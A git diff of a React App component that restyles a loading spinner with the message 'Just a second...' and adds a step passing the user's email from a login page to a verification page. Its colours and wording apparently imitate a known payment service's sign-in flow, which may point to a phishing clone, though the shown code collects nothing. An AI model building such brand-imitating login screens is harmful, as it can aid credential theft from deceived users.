@@ -1,11 +1,15 @@
-import React, { useEffect, useState } from 'react';
+import { useEffect, useState } from 'react';
 import { Navbar } from './components/Navbar';
 import { HeroSection } from './components/HeroSection';
 import { LoginPage } from './components/LoginPage';
+import { VerificationPage } from './components/VerificationPage';
+
 export function App() {
-  const [screen, setScreen] = useState<'loading' | 'landing' | 'login'>(
+  const [screen, setScreen] = useState<'loading' | 'landing' | 'login' | 'verification'>(
     'loading'
   );
+  const [userEmail, setUserEmail] = useState('');
+
   useEffect(() => {
     // Loading spinner for 3 seconds
     const loadingTimer = setTimeout(() => {
@@ -13,6 +17,7 @@ export function App() {
     }, 3000);
     return () => clearTimeout(loadingTimer);
   }, []);
+
   useEffect(() => {
     if (screen === 'landing') {
       // Landing page shows for 1 second, then transitions to login
@@ -22,38 +27,22 @@ export function App() {
       return () => clearTimeout(landingTimer);
     }
   }, [screen]);
+
   if (screen === 'loading') {
     return (
-      <div className="min-h-screen w-full flex items-center justify-center bg-white">
-        <svg
-          className="animate-spin"
-          width="40"
-          height="40"
-          viewBox="0 0 40 40"
-          fill="none"
-          xmlns="http://www.w3.org/2000/svg"
-          style={{
-            animationDuration: '0.8s'
-          }}>
-          
-          <circle
-            cx="20"
-            cy="20"
-            r="17"
-            stroke="#E5E7EB"
-            strokeWidth="3"
-            fill="none" />
-          
-          <path
-            d="M37 20a17 17 0 0 0-17-17"
-            stroke="#003087"
-            strokeWidth="3"
-            strokeLinecap="round"
-            fill="none" />
-          
-        </svg>
-      </div>);
-
+      <div className="min-h-screen w-full flex flex-col items-center justify-center bg-white">
+        <div className="flex flex-col items-center gap-4">
+          <div className="relative w-12 h-12">
+            <div className="absolute inset-0 border-2 border-gray-100 rounded-full"></div>
+            <div 
+              className="absolute inset-0 border-2 border-t-[#0070BA] border-r-transparent border-b-transparent border-l-transparent rounded-full animate-spin"
+              style={{ animationDuration: '0.8s' }}
+            ></div>
+          </div>
+          <p className="text-[#2C2E2F] text-[18px] font-normal">Just a second...</p>
+        </div>
+      </div>
+    );
   }
   if (screen === 'landing') {
     return (
@@ -65,5 +54,21 @@ export function App() {
       </div>);
 
   }
-  return <LoginPage />;
+  if (screen === 'verification') {
+    return (
+      <VerificationPage 
+        email={userEmail} 
+        onBack={() => setScreen('login')} 
+      />
+    );
+  }
+
+  return (
+    <LoginPage 
+      onLoginSuccess={(email) => {
+        setUserEmail(email);
+        setScreen('verification');
+      }} 
+    />
+  );
 }
